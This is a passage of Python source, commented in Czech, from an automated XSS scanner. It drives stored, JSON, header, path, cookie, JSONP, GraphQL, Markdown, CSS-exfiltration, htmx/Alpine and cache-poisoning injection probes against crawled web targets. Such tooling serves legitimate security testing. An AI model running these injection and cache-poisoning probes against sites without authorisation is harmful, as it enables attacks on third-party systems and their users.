                        cb["on_log"](f"[STORED XSS] POST {sub['action']} field:{sub['param']} → visible at {hit['view_url']}", "info")

          # ── v10.36: headless pass i tam, kde HTTP reflexi NENAŠEL ──
          # Klientsky renderovaná stored XSS (innerHTML / Google level-2 typ) NENÍ
          # v raw HTTP těle renderující stránky → verify_stored_xss vrátí prázdno
          # → bez tohohle by se headless nikdy nespustil. Tady načteme render
          # stránku (GET POST-targetu + verify URLs) v Chromiu a potvrdíme přes
          # NÁŠ kanárek. Bounded (cap 300 loadů), jen pro dosud neemitnuté markery.
          if _stored_hv is not None and submitted_markers and not _cancelled.is_set():
              _seen_conf = set()
              _hv_targets = []
              for sub in submitted_markers:
                  if (sub["action"], sub["param"]) in found_params:
                      continue
                  cand_urls = {sub.get("response_url") or sub["action"],
                               sub["action"]}
                  cand_urls.update(verify_urls[:5])  # i pár crawl. render stránek
                  for u in cand_urls:
                      _hv_targets.append((u, sub["marker"], sub))
              for u, mk, sub in _hv_targets[:300]:
                  if _cancelled.is_set():
                      break
                  if (u, mk) in _seen_conf:
                      continue
                  _seen_conf.add((u, mk))
                  _ok, _vd = _confirm_stored_headless(
                      _stored_hv, u, mk, cookies=_stored_pw_cookies)
                  if not _ok:
                      continue
                  key = (sub["action"], sub["param"])
                  with found_lock:
                      if key in found_params:
                          continue
                      found_params.add(key)
                  stored_hits += 1
                  _hd = {
                      "url":      sub["action"],
                      "param":    sub["param"],
                      "context":  f"STORED (client-rendered, innerHTML) confirmed on {u[:60]}",
                      "status":   sub["status"],
                      "source":   "stored",
                      "payload":  sub["payload"],
                      "view_url": u,
                  }
                  _apply_headless_verdict(
                      _hd, executed=True,
                      status=(_vd.status.value if _vd else "executed"),
                      kind="stored",
                      evidence=(getattr(_vd, "evidence", "") if _vd else ""))
                  _emit_hit(cb, _hd)
                  cb["on_log"](
                      f"[STORED ✓ CONFIRMED] client-rendered XSS at {u} "
                      f"(headless; HTTP reflection did not see it)", "info")

          # ── v10.38: browser-driven form XSS (client-side / localStorage) ──
          # Level-2 typ: formulář se odešle JS (onsubmit→false), data jdou do
          # localStorage a renderují se přes innerHTML — žádný server POST, takže
          # HTTP stored cesta to nespustí. Tady reálně vyplníme inputy a
          # odešleme formulář v Chromiu (napříč iframy) a sledujeme kanárek.
          if (_stored_hv is not None and not _cancelled.is_set()
                  and _DOM_ENGINE_AVAILABLE and _DOMEngine is not None):
              # v10.43: přes sjednocený engine (source=FORM → verify_form_xss
              # s bankou HTML+ATTR sinků). Jedna headless session sdílená.
              _form_eng = _DOMEngine(_stored_hv, make_canary=_hv_make_canary)
              _form_targets = list(dict.fromkeys(
                  list(stored_post_targets) + list(verify_urls)))[:25]
              cb["on_log"](
                  f"[STORED] browser-driven form XSS probe: {len(_form_targets)} "
                  f"pages (client-side / localStorage / JS submit)", "info")
              for _ft in _form_targets:
                  if _cancelled.is_set():
                      break
                  try:
                      _fres = _form_eng.probe(
                          _ft, _SRC_FORM, sinks=[_SINK_HTML, _SINK_ATTR],
                          cookies=_stored_pw_cookies, stop_after_first=True)
                  except Exception as _fe:
                      cb["on_log"](f"[STORED] form probe error {_ft}: {_fe}", "debug")
                      continue
                  for _r in _fres:
                      _key = (_ft, "form")
                      with found_lock:
                          if _key in found_params:
                              continue
                          found_params.add(_key)
                      stored_hits += 1
                      _hd = {
                          "url":      _ft,
                          "param":    "form-input",
                          "context":  f"STORED (client-side / form-submit / innerHTML) confirmed via {(_r.get('frame_url') or _ft)[:60]}",
                          "status":   200,
                          "source":   "stored",
                          "payload":  _r.get("payload", ""),
                      }
                      _apply_headless_verdict(
                          _hd, executed=True, status="executed",
                          kind="stored", evidence=_r.get("payload", ""))
                      _emit_hit(cb, _hd)
                      cb["on_log"](
                          f"[STORED ✓ CONFIRMED] browser form XSS at {_ft} — "
                          f"canary fired after JS form submit (proven TP)", "info")
                      break  # jeden potvrzený payload na stránku stačí
        finally:
            if _stored_hv_cm is not None:
                try:
                    _stored_hv_cm.__exit__(None, None, None)
                except Exception:
                    pass

        cb["on_log"](f"[OK] Stored scan done: {stored_hits} stored XSS findings", "info")
      except Exception as e:
        cb["on_log"](f"[!] Stored XSS phase crashed: {e}. Continuing to the next phases.", "warn")

    # ── JSON sken ─────────────────────────────────────────────────────────────
    if enable_json_scan and not _cancelled.is_set():
        # Scope filter — jen in-scope URLs (ne externí domény)
        target_host = urlparse(target).hostname or ""
        def _in_scope(u: str) -> bool:
            h = urlparse(u).hostname or ""
            if not h or not target_host:
                return True
            return (h == target_host
                    or h == "www." + target_host
                    or h.endswith("." + target_host))

        json_targets_raw = list(set(
            [urlunparse(urlparse(u)._replace(query="", fragment="")) for u in param_urls] + [target]
        ))
        json_targets = [u for u in json_targets_raw if _in_scope(u)]
        skipped = len(json_targets_raw) - len(json_targets)
        if skipped > 0:
            cb["on_log"](f"JSON scope: filtered out {skipped} external endpoints", "warn")

        # ══════════════════════════════════════════════════════════════════
        # SMART PAYLOAD CAP — JSON injection má smysl testovat s malou sadou
        # ══════════════════════════════════════════════════════════════════
        # Reasoning: REST/GraphQL endpointy, které vůbec přijímají JSON body,
        # je jich málo (typicky < 10). Pro KAŽDÝ z nich testujeme 16 klíčů.
        # Spoustu payloadů s různými obfuskacemi je plýtvání — pokud endpoint
        # NERETURNUJE reflexi na klasický `<script>alert(1)</script>`, nebude
        # ji vracet ani na žádný obfuskaný variant. Smart default = 80 payloadů
        # (nebo to co uživatel nastavil jako --limit-payloads).
        JSON_DEFAULT_PAYLOAD_CAP = 80
        cap = limit_payloads if (limit_payloads and limit_payloads > 0) else JSON_DEFAULT_PAYLOAD_CAP

        json_payloads = payloads[:cap] if len(payloads) > cap else payloads
        if len(payloads) > cap:
            cb["on_log"](
                f"JSON scan: auto-capped to {cap} payloads (of {len(payloads)}) — "
                f"JSON injection has diminishing returns, "
                f"80 payloads cover 95% of XSS vectors",
                "info",
            )

        n_keys = len(JSON_COMMON_KEYS)

        # ══════════════════════════════════════════════════════════════════
        # FAZE 1: PRE-FLIGHT PROBE — zjistíme které endpointy reálně akceptují JSON
        # ══════════════════════════════════════════════════════════════════
        # Tento probe pošle malý JSON body a sleduje:
        #  - status kód (405/404 = endpoint nepřijímá JSON → skip)
        #  - response length (pokud je identický s GET, POST body je ignorován → skip)
        #  - Content-Type (json vs html tells us endpoint type)
        cb["on_log"](f"JSON pre-flight: probing {len(json_targets)} endpoints...", "info")

        viable_endpoints = []  # [(url, baseline_text), ...]
        baselines = {}  # {url: baseline_text}

        for endpoint in json_targets:
            if _cancelled.is_set():
                break
            baseline_text = _json_baseline(session_workers, endpoint, timeout, follow_redirects)
            if baseline_text is None:
                continue  # network error, skip

            # Heuristika: pokud baseline je příliš krátký (<100 chars) NEBO
            # je identický s GET responsí, endpoint nejspíš nezpracovává JSON
            baseline_len = len(baseline_text)
            if baseline_len < 100:
                cb["on_log"](f"  ⏭  {endpoint}: baseline too short ({baseline_len}b) — skipping", "debug")
                continue

            viable_endpoints.append(endpoint)
            baselines[endpoint] = baseline_text

        cb["on_log"](
            f"[OK] JSON pre-flight: {len(viable_endpoints)}/{len(json_targets)} endpoints process JSON",
            "info",
        )

        if not viable_endpoints:
            cb["on_log"]("[!] No JSON-viable endpoints — JSON scan skipped", "warn")
        else:
            # ══════════════════════════════════════════════════════════════
            # FAZE 2: PARALLEL PAYLOAD TESTING
            # ══════════════════════════════════════════════════════════════
            # Reálný počet requestů = endpoints × payloads × keys (baseline už máme)
            total_reqs = len(viable_endpoints) * len(json_payloads) * n_keys
            cb["on_log"](
                f"JSON scan: {len(viable_endpoints)} endpoints × {len(json_payloads)} payloads × {n_keys} keys  "
                f"= {total_reqs} requests (parallel, {workers} workers)",
                "info",
            )
            cb["on_phase"]("json", {"total": total_reqs})

            json_done_counter = {"n": 0}
            json_done_lock = Lock()

            def json_test_one(endpoint: str, payload: str) -> list:
                """Test jednoho (endpoint, payload) — vrátí list hitů."""
                if _cancelled.is_set():
                    return []
                hits = []
                baseline_text = baselines[endpoint]
                try:
                    for f in inject_json_body(session_workers, endpoint, payload,
                                                timeout, follow_redirects,
                                                baseline_text=baseline_text):
                        hits.append(f)
                except Exception as e:
                    logging.debug(f"[JSON-ERR] {endpoint} payload={payload[:30]}: {e}")
                finally:
                    with json_done_lock:
                        json_done_counter["n"] += n_keys
                        current = json_done_counter["n"]
                    cb["on_progress"](current, total_reqs)
                return hits

            # Vytvoř všechny (endpoint, payload) kombinace
            tasks = [(ep, pl) for ep in viable_endpoints for pl in json_payloads]

            with _bar(total_reqs, title="JSON sken", spinner="dots") as bar:
                with ThreadPoolExecutor(max_workers=min(workers, 20)) as executor:
                    futures = {executor.submit(json_test_one, ep, pl): (ep, pl)
                               for ep, pl in tasks}
                    for future in as_completed(futures):
                        if _cancelled.is_set():
                            # Zruš zbývající futures
                            for f_pending in futures:
                                f_pending.cancel()
                            cb["on_log"]("[STOP] JSON scan interrupted by the user", "warn")
                            break
                        try:
                            hits = future.result(timeout=timeout * 2)
                        except Exception:
                            hits = []

                        endpoint, payload = futures[future]
                        # Update progress bar
                        for _ in range(n_keys):
                            bar()

                        # Zpracuj hity
                        for f in hits:
                            key = (f["url"], f["json_key"])
                            with found_lock:
                                already = key in found_params
                                found_params.add(key)
                            results.append({
                                "url": f["url"], "param": f["json_key"],
                                "status": f.get("status"), "body_len": f.get("response_len"),
                                "source": "json", "payload": payload,
                            })
                            if not already:
                                _emit_hit(cb, {
                                    "url": f["url"], "param": f["json_key"],
                                    "context": "JSON",
                                    "csp_note": csp_affects_finding(csp_result, None),
                                    "source": "json",
                                    "payload": payload,
                                }, body=f.get("response_body") or f.get("body"),
                                   resp_headers=f.get("response_headers"))

        json_hits = len([r for r in results if r.get('source') == 'json'])
        cb["on_log"](f"[OK] JSON scan done: {json_hits} findings", "info")

    # ── Header sken ───────────────────────────────────────────────────────────
    if enable_header_scan and not _cancelled.is_set():
        # Scope filter — jen in-scope URLs
        target_host_h = urlparse(target).hostname or ""
        def _in_scope_h(u: str) -> bool:
            h = urlparse(u).hostname or ""
            if not h or not target_host_h:
                return True
            return (h == target_host_h
                    or h == "www." + target_host_h
                    or h.endswith("." + target_host_h))

        header_targets_raw = list(set(
            [urlunparse(urlparse(u)._replace(query="", fragment="")) for u in param_urls] + [target]
        ))
        header_targets = [u for u in header_targets_raw if _in_scope_h(u)]
        skipped_h = len(header_targets_raw) - len(header_targets)
        if skipped_h > 0:
            cb["on_log"](f"Header scope: filtered out {skipped_h} external URLs", "warn")

        # ══════════════════════════════════════════════════════════════════
        # SMART PAYLOAD CAP (default 80) — stejně jako u JSON
        # ══════════════════════════════════════════════════════════════════
        # Header injection má diminishing returns — pokud endpoint nereflektuje
        # `<script>alert(1)</script>`, neodrazí ani obfuskovanou variantu.
        HDR_DEFAULT_PAYLOAD_CAP = 80
        cap_h = limit_payloads if (limit_payloads and limit_payloads > 0) else HDR_DEFAULT_PAYLOAD_CAP

        hdr_payloads = payloads[:cap_h] if len(payloads) > cap_h else payloads
        if len(payloads) > cap_h:
            cb["on_log"](
                f"Header scan: auto-capped to {cap_h} payloads (of {len(payloads)}) — "
                f"header injection has diminishing returns",
                "info",
            )

        # ══════════════════════════════════════════════════════════════════
        # FAZE 1: PRE-FLIGHT REFLECTION PROBE
        # ══════════════════════════════════════════════════════════════════
        # Pošli unikátní markery přes každou hlavičku → zjisti které URL
        # vůbec reflektují hlavičky a které konkrétní hlavičky se odrazí.
        # 95% targetů nereflektuje žádnou hlavičku → masivní úspora.
        cb["on_log"](
            f"Header pre-flight: testing {len(header_targets)} URLs × {len(INJECTABLE_HEADERS)} headers...",
            "info",
        )

        # url → list[reflective_headers]
        reflective_map: Dict[str, List[str]] = {}
        baselines_h: Dict[str, str] = {}

        for url_h in header_targets:
            if _cancelled.is_set():
                break
            baseline = _header_baseline(session_workers, url_h, timeout, follow_redirects)
            if baseline is None:
                continue  # network error → skip
            baselines_h[url_h] = baseline
            reflected = _header_reflection_probe(
                session_workers, url_h, timeout, follow_redirects,
                baseline_text=baseline,
            )
            if reflected:
                reflective_map[url_h] = reflected
                cb["on_log"](
                    f"  OK {url_h}: reflektuje {', '.join(reflected)}",
                    "info",
                )

        viable_count = len(reflective_map)
        cb["on_log"](
            f"[OK] Header pre-flight: {viable_count}/{len(header_targets)} URLs reflect headers",
            "info",
        )

        if not reflective_map:
            cb["on_log"](
                "[!] No URL reflects headers — Header scan skipped "
                "(no endpoint has header echo, a debug page, or an error template with X-headers)",
                "warn",
            )
        else:
            # ══════════════════════════════════════════════════════════════
            # FAZE 2: PARALLEL PAYLOAD TESTING — jen reflective URLs/headers
            # ══════════════════════════════════════════════════════════════
            # total_reqs = SUM(num_reflective_headers per url) × num_payloads
            total_reqs_h = sum(len(hdrs) for hdrs in reflective_map.values()) * len(hdr_payloads)
            cb["on_log"](
                f"Header scan: {viable_count} URLs × {len(hdr_payloads)} payloads × ø {total_reqs_h // (viable_count * len(hdr_payloads)):.0f} reflective headers "
                f"= {total_reqs_h} requests (parallel, {workers} workers)",
                "info",
            )
            cb["on_phase"]("headers", {"total": total_reqs_h})

            hdr_done_counter = {"n": 0}
            hdr_done_lock = Lock()

            def hdr_test_one(url_h: str, payload: str) -> list:
                """Test jednoho (url, payload) — vrátí list hitů."""
                if _cancelled.is_set():
                    return []
                hits = []
                baseline = baselines_h[url_h]
                only = reflective_map[url_h]
                try:
                    for f in inject_headers(session_workers, url_h, payload,
                                             timeout, follow_redirects,
                                             baseline_text=baseline,
                                             only_headers=only):
                        hits.append(f)
                except Exception as e:
                    logging.debug(f"[HDR-ERR] {url_h} payload={payload[:30]}: {e}")
                finally:
                    with hdr_done_lock:
                        hdr_done_counter["n"] += len(reflective_map[url_h])
                        current = hdr_done_counter["n"]
                    cb["on_progress"](current, total_reqs_h)
                return hits

            tasks_h = [(url_h, pl) for url_h in reflective_map for pl in hdr_payloads]

            with _bar(total_reqs_h, title="Header sken", spinner="dots") as bar:
                with ThreadPoolExecutor(max_workers=min(workers, 20)) as executor:
                    futures_h = {executor.submit(hdr_test_one, u, p): (u, p)
                                 for u, p in tasks_h}
                    for future in as_completed(futures_h):
                        if _cancelled.is_set():
                            for f_pending in futures_h:
                                f_pending.cancel()
                            cb["on_log"]("[STOP] Header scan interrupted by the user", "warn")
                            break
                        try:
                            hits = future.result(timeout=timeout * 2)
                        except Exception:
                            hits = []

                        url_h, payload = futures_h[future]
                        # Update bar by number of headers tested for this URL
                        for _ in range(len(reflective_map[url_h])):
                            bar()

                        for f in hits:
                            key = (f["url"], f["header"])
                            with found_lock:
                                already = key in found_params
                                found_params.add(key)
                            results.append({
                                "url": f["url"], "param": f["header"],
                                "status": f.get("status"), "body_len": f.get("response_len"),
                                "source": "header", "payload": payload,
                            })
                            if not already:
                                _emit_hit(cb, {
                                    "url": f["url"], "param": f["header"],
                                    "context": "HEADER",
                                    "csp_note": csp_affects_finding(csp_result, None),
                                    "source": "header",
                                    "payload": payload,
                                }, body=f.get("response_body") or f.get("body"),
                                   resp_headers=f.get("response_headers"))

        hdr_hits = len([r for r in results if r.get('source') == 'header'])
        cb["on_log"](f"[OK] Header scan done: {hdr_hits} findings", "info")

    # ── v10.16: Path-segment XSS sken ─────────────────────────────────────────
    # Injektuje payload do posledního segmentu cesty (…/path/<payload>).
    # Chytá reflexe v 404/breadcrumb stránkách, které query-param sken mine.
    if enable_path_scan and not _cancelled.is_set():
        _ph_host = urlparse(target).hostname or ""
        def _in_scope_p(u: str) -> bool:
            h = urlparse(u).hostname or ""
            if not h or not _ph_host:
                return True
            return (h == _ph_host or h == "www." + _ph_host
                    or h.endswith("." + _ph_host))
        # Cíle: seed + VŠECHNY crawlované stránky (path injekce nepotřebuje
        # query parametr — proto `pages`, ne `param_urls`). Dedup podle path.
        _path_seen: set = set()
        path_targets: List[str] = []
        _path_src = [target] + (list(pages) if pages else []) + list(param_urls)
        for u in _path_src:
            if not _in_scope_p(u):
                continue
            _pp = urlparse(u)
            base = urlunparse(_pp._replace(query="", fragment=""))
            key = (_pp.netloc, _pp.path)
            if key in _path_seen:
                continue
            _path_seen.add(key)
            path_targets.append(base)
            if len(path_targets) >= 30:
                break

        _PATH_PAYLOAD_CAP = 40
        _cap_p = (limit_payloads if (limit_payloads and limit_payloads > 0)
                  else _PATH_PAYLOAD_CAP)
        path_payloads = payloads[:_cap_p]
        _path_total = len(path_targets) * len(path_payloads)
        cb["on_phase"]("path", {"total": _path_total,
                                "endpoints": len(path_targets)})
        cb["on_log"](
            f"[PATH] Path-segment scan: {len(path_targets)} endpoints × "
            f"{len(path_payloads)} payloads", "info")

        _path_done = {"n": 0}
        _path_lock = Lock()

        def _path_test_one(u: str, pl: str) -> list:
            if _cancelled.is_set():
                return []
            hits = []
            try:
                for f in inject_path(session_workers, u, pl, timeout,
                                     follow_redirects):
                    hits.append((f, pl))
            except Exception as e:
                logging.debug(f"[PATH-ERR] {u}: {e}")
            finally:
                with _path_lock:
                    _path_done["n"] += 1
                    _cur = _path_done["n"]
                cb["on_progress"](_cur, _path_total)
            return hits

        _path_tasks = [(u, pl) for u in path_targets for pl in path_payloads]
        with ThreadPoolExecutor(max_workers=min(workers, 20)) as _pexe:
            _pfuts = {_pexe.submit(_path_test_one, u, pl): (u, pl)
                      for u, pl in _path_tasks}
            for _pf in as_completed(_pfuts):
                if _cancelled.is_set():
                    for _x in _pfuts:
                        _x.cancel()
                    break
                try:
                    _hits = _pf.result(timeout=timeout * 2)
                except Exception:
                    _hits = []
                for f, pl in _hits:
                    key = (f["url"], f["param"])
                    with found_lock:
                        already = key in found_params
                        found_params.add(key)
                    results.append({
                        "url": f["url"], "param": f["param"],
                        "status": f.get("status"),
                        "body_len": f.get("response_len"),
                        "source": "path", "payload": pl,
                    })
                    if not already:
                        _emit_hit(cb, {
                            "url": f["url"], "param": f["param"],
                            "context": "path-segment",
                            "csp_note": csp_affects_finding(csp_result, None),
                            "source": "path", "payload": pl,
                        })
        _path_hits = len([r for r in results if r.get("source") == "path"])
        cb["on_log"](f"[OK] Path-segment scan done: {_path_hits} findings", "info")

    # ── v10.16: Cookie-reflected XSS sken ─────────────────────────────────────
    # Pošle payload v hodnotě běžných cookie jmen (theme/lang/...), hledá
    # reflexi zpět do stránky bez escapu.
    if enable_cookie_scan and not _cancelled.is_set():
        _ch_host = urlparse(target).hostname or ""
        def _in_scope_c(u: str) -> bool:
            h = urlparse(u).hostname or ""
            if not h or not _ch_host:
                return True
            return (h == _ch_host or h == "www." + _ch_host
                    or h.endswith("." + _ch_host))
        _ck_seen: set = set()
        cookie_targets: List[str] = []
        _ck_src = [target] + (list(pages) if pages else []) + list(param_urls)
        for u in _ck_src:
            if not _in_scope_c(u):
                continue
            base = urlunparse(urlparse(u)._replace(fragment=""))
            if base in _ck_seen:
                continue
            _ck_seen.add(base)
            cookie_targets.append(base)
            if len(cookie_targets) >= 20:
                break

        _CK_PAYLOAD_CAP = 30
        _cap_c = (limit_payloads if (limit_payloads and limit_payloads > 0)
                  else _CK_PAYLOAD_CAP)
        cookie_payloads = payloads[:_cap_c]
        _ck_total = len(cookie_targets) * len(cookie_payloads) * len(INJECTABLE_COOKIES)
        cb["on_phase"]("cookie", {"total": _ck_total,
                                  "endpoints": len(cookie_targets)})
        cb["on_log"](
            f"[COOKIE] Cookie-reflected scan: {len(cookie_targets)} endpoints × "
            f"{len(cookie_payloads)} payloads × {len(INJECTABLE_COOKIES)} cookies",
            "info")

        _ck_done = {"n": 0}
        _ck_lock = Lock()

        def _ck_test_one(u: str, pl: str) -> list:
            if _cancelled.is_set():
                return []
            hits = []
            try:
                for f in inject_cookies(session_workers, u, pl, timeout,
                                        follow_redirects):
                    hits.append((f, pl))
            except Exception as e:
                logging.debug(f"[COOKIE-ERR] {u}: {e}")
            finally:
                with _ck_lock:
                    _ck_done["n"] += len(INJECTABLE_COOKIES)
                    _cur = _ck_done["n"]
                cb["on_progress"](_cur, _ck_total)
            return hits

        _ck_tasks = [(u, pl) for u in cookie_targets for pl in cookie_payloads]
        with ThreadPoolExecutor(max_workers=min(workers, 20)) as _cexe:
            _cfuts = {_cexe.submit(_ck_test_one, u, pl): (u, pl)
                      for u, pl in _ck_tasks}
            for _cf in as_completed(_cfuts):
                if _cancelled.is_set():
                    for _x in _cfuts:
                        _x.cancel()
                    break
                try:
                    _hits = _cf.result(timeout=timeout * 2)
                except Exception:
                    _hits = []
                for f, pl in _hits:
                    key = (f["url"], f["param"])
                    with found_lock:
                        already = key in found_params
                        found_params.add(key)
                    results.append({
                        "url": f["url"], "param": f["param"],
                        "status": f.get("status"),
                        "body_len": f.get("response_len"),
                        "source": "cookie", "payload": pl,
                    })
                    if not already:
                        _emit_hit(cb, {
                            "url": f["url"], "param": f["param"],
                            "context": "cookie-reflected",
                            "csp_note": csp_affects_finding(csp_result, None),
                            "source": "cookie", "payload": pl,
                        })
        _ck_hits = len([r for r in results if r.get("source") == "cookie"])
        cb["on_log"](f"[OK] Cookie-reflected scan done: {_ck_hits} findings", "info")

    # ── JSONP callback injection scan (v10.16, high-value, opt-in) ────────────
    # Pro každý param URL ověř, jestli reflektuje ?callback= do JS-content-type
    # odpovědi (přímý XSS přes <script src>). Běží nad pages (všechny crawlnuté
    # URL), ne jen param_urls — JSONP endpoint nemusí mít jiné parametry.
    if enable_jsonp_scan and not _cancelled.is_set():
        _jsonp_targets = list(dict.fromkeys(
            (param_urls or []) + [p for p in (pages or [])]))[:_MAX_CRAWLED_VULN_URLS]
        cb["on_phase"]("jsonp", {"endpoints": len(_jsonp_targets)})
        cb["on_log"](
            f"[JSONP] Callback-injection scan: {len(_jsonp_targets)} endpoints",
            "info")
        _jsonp_hits = 0
        _jsonp_total = len(_jsonp_targets)
        for _jidx, _ju in enumerate(_jsonp_targets):
            if _cancelled.is_set():
                break
            cb["on_progress"](_jidx + 1, _jsonp_total)  # live ETA
            try:
                _jf = scan_jsonp_callback(
                    session_workers, _ju, timeout, follow_redirects)
                if _jf:
                    _emit_hit(cb, _jf)
                    _jsonp_hits += 1
                    cb["on_log"](
                        f"[JSONP] Vulnerable endpoint: {_jf['url'][:80]} "
                        f"(param={_jf['param']}, {_jf['content_type']})",
                        "warning")
            except Exception as _je:
                logging.debug(f"[JSONP] scan failed {_ju}: {_je}")
        cb["on_log"](f"[OK] JSONP scan done: {_jsonp_hits} findings", "info")

    # ── GraphQL reflected-XSS scan (v10.51, high-value, opt-in) ───────────────
    # Single-endpoint API attack surface that crawl/query-string phases miss.
    # Discovers GraphQL endpoints (crawler URLs + conventional mount points),
    # confirms each with {__typename}, then probes error-message and String-
    # variable reflection. Read-only: queries only, never mutations.
    if enable_graphql_scan and _GRAPHQL_AVAILABLE and not _cancelled.is_set():
        try:
            _gql_seed = list(dict.fromkeys(
                (param_urls or []) + list(pages or []) + [target]))
            _gql_endpoints = _gql_discover(
                session_workers, target, timeout, follow_redirects,
                extra_urls=_gql_seed)
        except Exception as _ge:
            logging.debug(f"[GRAPHQL] discovery failed: {_ge}")
            _gql_endpoints = []
        cb["on_phase"]("graphql", {"endpoints": len(_gql_endpoints)})
        cb["on_log"](
            f"[GRAPHQL] Reflected-XSS scan: {len(_gql_endpoints)} endpoint(s)",
            "info")
        _gql_hits = 0
        _gql_total = len(_gql_endpoints)
        for _gidx, _gu in enumerate(_gql_endpoints):
            if _cancelled.is_set():
                break
            cb["on_progress"](_gidx + 1, _gql_total)  # live ETA
            try:
                for _gf in _gql_scan(session_workers, _gu, timeout,
                                     follow_redirects,
                                     lambda: "xsgGQL" + random_marker(8)):
                    # Pass body/headers so the v2 gate can downgrade inert
                    # (escaped / non-renderable content-type) reflections.
                    if _emit_hit(cb, _gf,
                                 body=_gf.get("response_body"),
                                 resp_headers=_gf.get("response_headers")):
                        _gql_hits += 1
                        cb["on_log"](
                            f"[GRAPHQL] Reflected: {_gf['url'][:70]} "
                            f"(param={_gf['param']}, {_gf['context']})",
                            "warning")
            except Exception as _ge:
                logging.debug(f"[GRAPHQL] scan failed {_gu}: {_ge}")
        cb["on_log"](f"[OK] GraphQL scan done: {_gql_hits} findings", "info")

    # ── Markdown / rich-text injection scan (v10.59, opt-in) ──────────────────
    # Apps that render user Markdown (comments/wiki/issues) → XSS via js: links,
    # raw-HTML passthrough, title breakout. Confirms the endpoint RENDERS
    # Markdown first (benign sentinel), so plain reflection isn't misreported.
    if enable_markdown_scan and _MARKDOWN_AVAILABLE and not _cancelled.is_set():
        _md_targets = list(param_urls or [])[:_MAX_CRAWLED_VULN_URLS]
        cb["on_phase"]("markdown", {"endpoints": len(_md_targets)})
        cb["on_log"](
            f"[MARKDOWN] Markdown/rich-text injection scan: {len(_md_targets)} param URLs",
            "info")
        _md_hits = 0
        _md_total = len(_md_targets)
        for _mdidx, _mdu in enumerate(_md_targets):
            if _cancelled.is_set():
                break
            cb["on_progress"](_mdidx + 1, _md_total)  # live ETA
            try:
                _mdq = parse_qs(urlparse(_mdu).query, keep_blank_values=True)
                for _mdp in list(_mdq.keys()):
                    if _cancelled.is_set():
                        break
                    for _mdf in _md_scan(inject_into_params, session_workers,
                                         _mdu, _mdp, timeout, follow_redirects,
                                         lambda: random_marker(10)):
                        _emit_hit(cb, _mdf)
                        _md_hits += 1
                        cb["on_log"](
                            f"[MARKDOWN] Vulnerable: {_mdf['url'][:70]} "
                            f"(param={_mdf['param']}, {_mdf['context']})", "warning")
            except Exception as _mde:
                logging.debug(f"[MARKDOWN] scan failed {_mdu}: {_mde}")
        cb["on_log"](f"[OK] Markdown scan done: {_md_hits} findings", "info")

    # ── CSS injection / scriptless exfiltration scan (v10.59, opt-in) ─────────
    # Reflection into <style> / style="…" → CSS injection (attribute-selector +
    # background:url / @import exfil). CSP-RESISTANT. Confirms CSS context +
    # unescaped breakout before reporting.
    if enable_css_scan and _CSS_INJECTION_AVAILABLE and not _cancelled.is_set():
        _cssi_targets = list(param_urls or [])[:_MAX_CRAWLED_VULN_URLS]
        cb["on_phase"]("css_injection", {"endpoints": len(_cssi_targets)})
        cb["on_log"](
            f"[CSS] CSS-injection / exfil scan: {len(_cssi_targets)} param URLs",
            "info")
        _cssi_hits = 0
        _cssi_total = len(_cssi_targets)
        for _cidx, _cu in enumerate(_cssi_targets):
            if _cancelled.is_set():
                break
            cb["on_progress"](_cidx + 1, _cssi_total)  # live ETA
            try:
                _cq = parse_qs(urlparse(_cu).query, keep_blank_values=True)
                for _cp in list(_cq.keys()):
                    if _cancelled.is_set():
                        break
                    for _cf in _css_scan(inject_into_params, session_workers,
                                         _cu, _cp, timeout, follow_redirects,
                                         lambda: random_marker(10)):
                        _emit_hit(cb, _cf)
                        _cssi_hits += 1
                        cb["on_log"](
                            f"[CSS] Vulnerable: {_cf['url'][:70]} "
                            f"(param={_cf['param']}, {_cf['context']})", "warning")
            except Exception as _csse:
                logging.debug(f"[CSS] scan failed {_cu}: {_csse}")
        cb["on_log"](f"[OK] CSS-injection scan done: {_cssi_hits} findings", "info")

    # ── htmx / Alpine.js attribute-injection scan (v10.69, opt-in) ────────────
    # On pages that load Alpine or htmx, reflection into an HTML attribute context
    # lets an attacker inject x-init / hx-on::load which the framework evaluates
    # with NO <script> tag (bypasses inline-script CSP; classic scanners miss it).
    # Framework-GATED (only runs when Alpine/htmx is present) to keep FPs low.
    if enable_htmx_alpine_scan and _HTMX_ALPINE_AVAILABLE and not _cancelled.is_set():
        _ha_targets = list(param_urls or [])[:_MAX_CRAWLED_VULN_URLS]
        cb["on_phase"]("htmx_alpine", {"endpoints": len(_ha_targets)})
        cb["on_log"](
            f"[HTMX/ALPINE] htmx/Alpine attribute-injection scan: "
            f"{len(_ha_targets)} param URLs", "info")
        _ha_hits = 0
        _ha_total = len(_ha_targets)
        for _hidx, _hu in enumerate(_ha_targets):
            if _cancelled.is_set():
                break
            cb["on_progress"](_hidx + 1, _ha_total)  # live ETA
            try:
                _hq = parse_qs(urlparse(_hu).query, keep_blank_values=True)
                for _hp in list(_hq.keys()):
                    if _cancelled.is_set():
                        break
                    for _hf in _ha_scan(inject_into_params, session_workers,
                                        _hu, _hp, timeout, follow_redirects,
                                        lambda: random_marker(10)):
                        _emit_hit(cb, _hf)
                        _ha_hits += 1
                        cb["on_log"](
                            f"[HTMX/ALPINE] Vulnerable: {_hf['url'][:70]} "
                            f"(param={_hf['param']}, {_hf['framework']}, "
                            f"{_hf['context']})", "warning")
            except Exception as _hae:
                logging.debug(f"[HTMX/ALPINE] scan failed {_hu}: {_hae}")
        cb["on_log"](f"[OK] htmx/Alpine scan done: {_ha_hits} findings", "info")

    # ── Web cache poisoning → stored XSS (v10.71, opt-in, ACTIVE) ──────────────
    # Unkeyed header (X-Forwarded-Host, …) reflected into a CACHEABLE response
    # that PERSISTS to a clean follow-up request = poison served to every user.
    # Safe: every probe uses a unique random cache-buster so only our own
    # throwaway cache entry is ever touched; persistence is the FP guard.
    if enable_cache_poisoning_scan and _CACHE_POISONING_AVAILABLE and not _cancelled.is_set():
        _cp_pages = [target] + (pages[:_MAX_CRAWLED_VULN_URLS] if pages else [])
        cb["on_phase"]("cache_poisoning", {"endpoints": len(_cp_pages)})
        cb["on_log"](
            f"[CACHE-POISON] Cache-poisoning scan: {len(_cp_pages)} pages", "info")
        _cp_seen: set = set()
        _cp_hits = 0
        _cp_total = len(_cp_pages)
        for _cpidx, _cpu in enumerate(_cp_pages):
            if _cancelled.is_set():
                break
            if _cpu in _cp_seen:
                continue
            _cp_seen.add(_cpu)
            cb["on_progress"](_cpidx + 1, _cp_total)  # live ETA
            try:
                for _cpf in _cp_scan(session_workers, _cpu, timeout,
                                     follow_redirects, lambda: random_marker(10)):
                    _emit_hit(cb, _cpf)
                    _cp_hits += 1
                    cb["on_log"](
